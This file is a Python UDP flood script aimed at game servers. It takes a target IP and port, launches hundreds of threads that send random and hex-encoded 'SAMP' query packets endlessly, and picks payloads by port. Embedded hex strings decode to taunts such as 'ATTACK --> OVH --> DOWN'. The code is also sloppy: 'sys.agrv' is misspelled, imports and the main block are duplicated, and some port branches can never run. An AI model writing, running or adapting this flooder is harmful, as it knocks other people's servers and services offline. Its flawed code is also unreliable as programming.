import socket
import struct
import codecs,sys
import threading
import random
import time
import signal
import time
import socket
import random
import threading
import sys
import os
from os import system, name
import os

ip = str(sys.agrv[1])
port = int(sys.agrv[2])
times = int(sys.argv[3])
orgip = ip

def run():
	data = random._urandom(811)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +f"Attack to ip {orgip} and port {port}")
		except:
			s.close()

Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#y
                       codecs.decode("58414c4241444f52202d2d3e2041545441434b202d2d3e204f5648202d2d3e20444f574e","hex_codec"),#ai
                       codecs.decode("5448454a4159202d2d3e2041545441434b202d2d3e205544502053414d50202d2d3e20444f574e","hex_codec"),#u
                       codecs.decode("44444f532041545441434b202d3e2042592058414c4241444f52202d3e2053454e44","hex_codec"),#i
                       codecs.decode("544845204a4159202d3e2041545441434b202d3e20534552564552","hex_codec"),#u
                       codecs.decode("5448454a415920582058414c4241444f52202d3e2041545441434b202d3e204558504c4f4954202d3e20534552564552202d3e20554450","hex_codec"),#asu
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#778
                       codecs.decode("3830302c37372c363631","hex_codec"),#661
                       codecs.decode("35312c31352c363636","hex_codec"),#771
                       codecs.decode("37312c31382c313737","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("021efd40","hex_codec"),#cookie port 1111
                       codecs.decode("35342c38302c3232","hex_codec"),#cookie port 7771 
                       codecs.decode("081e7eda","hex_codec")#cookie port 1111 tambem
                       ]



class MyThread(threading.Thread):
     def run(self):
         while True:
                sock = socket.socket(
                    socket.AF_INET, socket.SOCK_DGRAM)
                
                msg = Pacotes[random.randrange(0,5)]
                     
                sock.sendto(msg, (ip, int(port)))
                
                
                if(int(port) == 7777):
                    sock.sendto(Pacotes[5], (ip, int(port)))
                    sock.sendto(Pacotes[5], (ip, int(port)))
                    sock.sendto(Pacotes[5], (ip, int(port)))
                elif(int(port) == 7796):
                    sock.sendto(Pacotes[4], (ip, int(port)))
                elif(int(port) == 7771):
                    sock.sendto(Pacotes[6], (ip, int(port)))
                elif(int(port) == 7784):
                    sock.sendto(Pacotes[7], (ip, int(port)))
                elif(int(port) == 1111):
                    sock.sendto(Pacotes[9], (ip, int(port)))
                elif(int(port) == 7778):
                    sock.sendto(Pacotes[8], (ip, int(port)))
                elif(int(port) == 2023):
                    sock.sendto(Pacotes[3], (ip, int(port)))
                elif(int(port) == 7776):
                    sock.sendto(Pacotes[10], (ip, int(port)))
                elif(int(port) == 7787):
                    sock.sendto(Pacotes[11], (ip, int(port)))
                elif(int(port) == 7777):
                    sock.sendto(Pacotes[12], (ip, int(port)))
                elif(int(port) == 6666):
                    sock.sendto(Pacotes[13], (ip, int(port)))    


class MyThread1(threading.Thread):
     def run(self):
         while True:
                sock = socket.socket(
                    socket.AF_INET, socket.SOCK_DGRAM)
                
                msg = Pacotes[random.randrange(0,2)]
                     
                sock.sendto(msg, (ip, int(port)))
                
                
                if(int(port) == 7777):
                    sock.sendto(Pacotes[5], (ip, int(port)))
                    sock.sendto(Pacotes[5], (ip, int(port)))
                    sock.sendto(Pacotes[5], (ip, int(port)))
                elif(int(port) == 7796):
                    sock.sendto(Pacotes[4], (ip, int(port)))
                elif(int(port) == 7771):
                    sock.sendto(Pacotes[6], (ip, int(port)))
                elif(int(port) == 7784):
                    sock.sendto(Pacotes[7], (ip, int(port)))
                elif(int(port) == 1111):
                    sock.sendto(Pacotes[9], (ip, int(port)))
                elif(int(port) == 7778):
                    sock.sendto(Pacotes[8], (ip, int(port)))
                elif(int(port) == 2023):
                    sock.sendto(Pacotes[3], (ip, int(port)))
                elif(int(port) == 7776):
                    sock.sendto(Pacotes[10], (ip, int(port)))
                elif(int(port) == 7787):
                    sock.sendto(Pacotes[11], (ip, int(port)))
                elif(int(port) == 7777):
                    sock.sendto(Pacotes[12], (ip, int(port)))
                elif(int(port) == 6666):
                    sock.sendto(Pacotes[13], (ip, int(port)))


class MyThread2(threading.Thread):
     def run(self):
         while True:
                sock = socket.socket(
                    socket.AF_INET, socket.SOCK_DGRAM)
                
                msg = Pacotes[random.randrange(0,3)]
                     
                sock.sendto(msg, (ip, int(port)))
                
                
                if(int(port) == 7777):
                    sock.sendto(Pacotes[5], (ip, int(port)))
                    sock.sendto(Pacotes[5], (ip, int(port)))
                    sock.sendto(Pacotes[5], (ip, int(port)))
                elif(int(port) == 7796):
                    sock.sendto(Pacotes[4], (ip, int(port)))
                elif(int(port) == 7771):
                    sock.sendto(Pacotes[6], (ip, int(port)))
                elif(int(port) == 7784):
                    sock.sendto(Pacotes[7], (ip, int(port)))
                elif(int(port) == 1111):
                    sock.sendto(Pacotes[9], (ip, int(port)))
                elif(int(port) == 7778):
                    sock.sendto(Pacotes[8], (ip, int(port)))
                elif(int(port) == 2023):
                    sock.sendto(Pacotes[3], (ip, int(port)))
                elif(int(port) == 7776):
                    sock.sendto(Pacotes[10], (ip, int(port)))
                elif(int(port) == 7787):
                    sock.sendto(Pacotes[11], (ip, int(port)))
                elif(int(port) == 7777):
                    sock.sendto(Pacotes[12], (ip, int(port)))
                elif(int(port) == 6666):
                    sock.sendto(Pacotes[13], (ip, int(port)))
                    
    
class MyThread3(threading.Thread):
     def run(self):
         while True:
                sock = socket.socket(
                    socket.AF_INET, socket.SOCK_DGRAM)
                
                msg = Pacotes[random.randrange(0,1)]
                     
                sock.sendto(msg, (ip, int(port)))
                
                
                if(int(port) == 7777):
                    sock.sendto(Pacotes[5], (ip, int(port)))
                    sock.sendto(Pacotes[5], (ip, int(port)))
                    sock.sendto(Pacotes[5], (ip, int(port)))
                elif(int(port) == 7796):
                    sock.sendto(Pacotes[4], (ip, int(port)))
                elif(int(port) == 7771):
                    sock.sendto(Pacotes[6], (ip, int(port)))
                elif(int(port) == 7784):
                    sock.sendto(Pacotes[7], (ip, int(port)))
                elif(int(port) == 1111):
                    sock.sendto(Pacotes[9], (ip, int(port)))
                elif(int(port) == 7778):
                    sock.sendto(Pacotes[8], (ip, int(port)))
                elif(int(port) == 2023):
                    sock.sendto(Pacotes[3], (ip, int(port)))
                elif(int(port) == 7776):
                    sock.sendto(Pacotes[10], (ip, int(port)))
                elif(int(port) == 7787):
                    sock.sendto(Pacotes[11], (ip, int(port)))
                elif(int(port) == 7177):
                    sock.sendto(Pacotes[12], (ip, int(port)))
                elif(int(port) == 6666):
                    sock.sendto(Pacotes[13], (ip, int(port)))   



for y in range(200):
		th = threading.Thread(target = run)
		th.start()

if __name__ == '__main__':
    try:
     for x in range(100):                                    
            mythread = MyThread()
            mythread1 = MyThread1()
            mythread2 = MyThread2()
            mythread3 = MyThread3()
            mythread1.start()
            mythread2.start()
            mythread3.start()
            mythread.start()
            time.sleep(.1)    
    except(KeyboardInterrupt):
         os.system('cls' if os.name == 'nt' else 'clear')
         
         print("Close")
         pass

if __name__ == '__main__':
    try:
     for x in range(200):                                    
            mythread = MyThread()
            mythread1 = MyThread1()
            mythread2 = MyThread2()
            mythread3 = MyThread3()
            mythread1.start()
            mythread2.start()
            mythread3.start()
            mythread.start()
            time.sleep(.1)    
    except(KeyboardInterrupt):
         os.system('cls' if os.name == 'nt' else 'clear')
         
         print("Close")
         pass
